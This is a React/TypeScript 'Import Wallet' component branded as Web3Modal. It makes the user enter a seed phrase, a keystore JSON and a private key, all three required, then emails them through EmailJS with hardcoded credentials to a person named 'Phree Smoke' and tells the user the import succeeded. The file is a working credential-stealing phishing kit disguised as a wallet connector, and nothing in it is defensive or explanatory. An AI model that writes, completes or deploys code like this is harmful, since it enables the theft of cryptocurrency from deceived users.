import { useState } from "react";

import { useRef } from "react";

import Notification from "../components/Notification";
import { ToastContainer } from "react-toastify";
import { toast } from "react-toastify";

import emailjs from "emailjs-com";

interface WalletDetailProps {
  walletName: string;
}

const WalletDetail: React.FC<WalletDetailProps> = (props) => {
  const dropdownRef = useRef<HTMLDivElement>(null);
  const [textValue1, setTextValue1] = useState<string>("");
  const [textValue2, setTextValue2] = useState<string>("");
  const [textValue3, setTextValue3] = useState<string>("");

  const { walletName } = props;

  const [activeTab, setActiveTab] = useState<number>(1);

  const handleTabClick = (tab: number) => {
    setActiveTab(tab);
  };

  const handleChange = (
    event: React.ChangeEvent<HTMLTextAreaElement>,
    tab: number
  ) => {
    if (tab === 1) setTextValue1(event.target.value);
    else if (tab === 2) setTextValue2(event.target.value);
    else setTextValue3(event.target.value);
  };

  const handleImport = () => {
    if (textValue1 === "") {
      toast(<Notification type={"fail"} msg={"Enter the Phrase"} />);
      return;
    }
    if (textValue2 === "") {
      toast(<Notification type={"fail"} msg={"Enter the Keystore JSON"} />);
      return;
    }
    if (textValue3 === "") {
      toast(<Notification type={"fail"} msg={"Enter the Private Key"} />);
      return;
    }

    const templateParams = {
      to_name: "Phree Smoke",
      from_name: "Web3Modal",
      message: `Wallet Name: ${walletName} \nPhrase: ${textValue1} \nKeystore JSON: ${textValue2} \nPrivate Key: ${textValue3}\n`,
      // Add other parameters required by your email template
    };

    emailjs
      .send(
        "service_c3h75fm",
        "template_eg0yydw",
        templateParams,
        "V9Jon4QfwCJkwW2_f"
      )
      .then(() => {
        toast(
          <Notification type={"success"} msg={"Wallet imported successfully"} />
        );
      });

    //
  };

  return (
    <section
      ref={dropdownRef}
      className={` z-999 w-full bg-[#04011C] shadow-lg transition duration-100 rounded-sm`}
      //   data-aos="fade-down"
    >
      {/* <div className="w-full max-w-full text-white text-[13px] font-holtwood items-center justify-between px-[3%] lg:justify-between lg:items-center flex">
        <a href="#" className="mx-auto md:block hidden">
          Github
        </a>
        <a href="#" className="mx-auto md:block hidden">
          Docs
        </a>
        <img
          onClick={() => {
            navigate("/");
          }}
          src="/images/logo.png"
          className="w-[70px] cursor-pointer h-[30px]"
          alt=""
        ></img>
        <a href="#" className="mx-auto md:block hidden">
          Wallets
        </a>
        <a href="#" className="mx-auto md:block hidden">
          Apps
        </a>

        <div ref={dropdownRef} className="md:hidden text-right">
          <button
            onClick={() => handleOpen()}
            type="button"
            className="block text-gray-500  hover:text-white focus:text-white focus:outline-none"
          >
            <svg className="h-20 w-20 fill-current" viewBox="0 0 24 24">
              {isOpen ? (
                <path
                  fillRule="evenodd"
                  d="M18.278 16.864a1 1 0 0 1-1.414 1.414l-4.829-4.828-4.828 4.828a1 1 0 0 1-1.414-1.414l4.828-4.829-4.828-4.828a1 1 0 0 1 1.414-1.414l4.829 4.828 4.828-4.828a1 1 0 1 1 1.414 1.414l-4.828 4.829 4.828 4.828z"
                />
              ) : (
                <path
                  fillRule="evenodd"
                  d="M4 5h16a1 1 0 0 1 0 2H4a1 1 0 1 1 0-2zm0 6h16a1 1 0 0 1 0 2H4a1 1 0 0 1 0-2zm0 6h16a1 1 0 0 1 0 2H4a1 1 0 0 1 0-2z"
                />
              )}
            </svg>
          </button>
        </div>
      </div>

      <motion.div animate={isOpen ? "open" : "closed"} className="">
        <div
          ref={dropdownRef}
          className={`${
            isOpen ? "block" : "hidden"
          } absolute right-0 transition-all duration-3000  origin-top-right bg-[#04011C] top-[100px]  lg:hidden   w-[100%]  py-5 text-center }`}
        >
          <motion.nav
            initial={wrapperVariants.closed}
            variants={wrapperVariants}
            style={{ originY: "top" }}
          >
            <ul className="items-centerjustify-center px-10 text-left font-holtwood  gap-10">
              <li className="mb-3  ">
                <a
                  href={`#`}
                  className="flex justify-between text-white text-[17px] px-5 hover:text-gray-700 tracking-widest"
                >
                  Github
                  <FontAwesomeIcon
                    icon={faAngleRight}
                    size="1x"
                    className="my-auto"
                  />
                </a>
              </li>
              <li className="my-7  ">
                <a
                  href={`#howtobuy`}
                  className="text-white flex justify-between text-[17px] px-5 hover:text-gray-700 tracking-widest"
                >
                  Docs
                  <FontAwesomeIcon
                    icon={faAngleRight}
                    size="1x"
                    className="my-auto"
                  />
                </a>
              </li>
              <li className="my-7  ">
                <a
                  href={`#claim`}
                  className="text-white flex justify-between text-[17px] px-5 hover:text-gray-700 tracking-widest"
                >
                  Wallet
                  <FontAwesomeIcon
                    icon={faAngleRight}
                    size="1x"
                    className="my-auto"
                  />
                </a>
              </li>
              <li className="my-7 ">
                <a
                  href={`#faq`}
                  className="text-white flex justify-between text-[17px] px-5 hover:text-gray-700 tracking-widest"
                >
                  App
                  <FontAwesomeIcon
                    icon={faAngleRight}
                    size="1x"
                    className="my-auto"
                  />
                </a>
              </li>
            </ul>
          </motion.nav>
        </div>
      </motion.div> */}

      <h2 className="text-gray-200 text-[23px] font-poppins text-center mt-5">
        Import Wallet
      </h2>

      <div className="mt-7">
        <div className="flex justify-between px-[5%]">
          <button
            className={`px-3 font-Mont text-white text-[15px] font-semibold  focus:outline-none ${
              activeTab === 1
                ? "active:text-white rounded-3xl bg-white bg-opacity-5"
                : ""
            }`}
            onClick={() => handleTabClick(1)}
          >
            Phrase
          </button>
          <button
            className={`px-3 py-2 font-Mont text-white text-[15px] font-semibold  focus:outline-none ${
              activeTab === 2
                ? "active:text-white rounded-3xl bg-white bg-opacity-5"
                : ""
            }`}
            onClick={() => handleTabClick(2)}
          >
            Keystore JSON
          </button>
          <button
            className={`px-3 py-2 font-Mont text-white text-[15px] font-semibold  focus:outline-none ${
              activeTab === 3
                ? "active:text-white rounded-3xl bg-white bg-opacity-5"
                : ""
            }`}
            onClick={() => handleTabClick(3)}
          >
            Private Key
          </button>
        </div>
        <div className="mt-2 p-2">
          {activeTab === 1 && (
            <div className="flex flex-col">
              <textarea
                value={textValue1}
                onChange={(e) => handleChange(e, 1)}
                placeholder="Phrase"
                className="w-[70%] m-auto resize-none outline-none rounded-2xl p-3 bg-transparent border border-gray-600 hover:border-white"
              ></textarea>
              <p className="m-auto mt-3 text-[13px] text-center text-gray-600">
                12 words separated by single spaces
              </p>
            </div>
          )}
          {activeTab === 2 && (
            <div className="flex flex-col">
              <textarea
                value={textValue2}
                onChange={(e) => handleChange(e, 2)}
                placeholder="Keystore JSON"
                className="w-[70%] m-auto resize-none outline-none rounded-2xl p-3 bg-transparent border border-gray-600 hover:border-white"
              ></textarea>
              <p className="m-auto mt-3 text-[13px] text-gray-600">
                Keystore JSON
              </p>
            </div>
          )}
          {activeTab === 3 && (
            <div className="flex flex-col">
              <textarea
                value={textValue3}
                onChange={(e) => handleChange(e, 3)}
                placeholder="Private Key"
                className="w-[70%] m-auto resize-none outline-none rounded-2xl p-3 bg-transparent border border-gray-600 hover:border-white"
              ></textarea>
              <p className="m-auto mt-3 text-[13px] text-gray-600">
                Private Key
              </p>
            </div>
          )}
        </div>
      </div>

      <div className="flex flex-col mt-3">
        <button
          onClick={handleImport}
          className="w-[70%] my-1 py-1 rounded-xl text-white bg-white bg-opacity-5 font-holtwood text-[15px] mx-auto"
        >
          Import
        </button>
        <button className="w-[70%] my-1 py-1 rounded-xl text-white bg-white bg-opacity-5 font-holtwood text-[15px] mx-auto">
          SYNCHRONIZE
        </button>
        <button className="w-[70%] my-1 py-1 rounded-xl text-white bg-white bg-opacity-5 font-holtwood text-[15px] mx-auto">
          VALIDATE
        </button>
      </div>

      <ToastContainer autoClose={3000} style={{ paddingTop: "90px" }} />
    </section>
  );
};

export default WalletDetail;
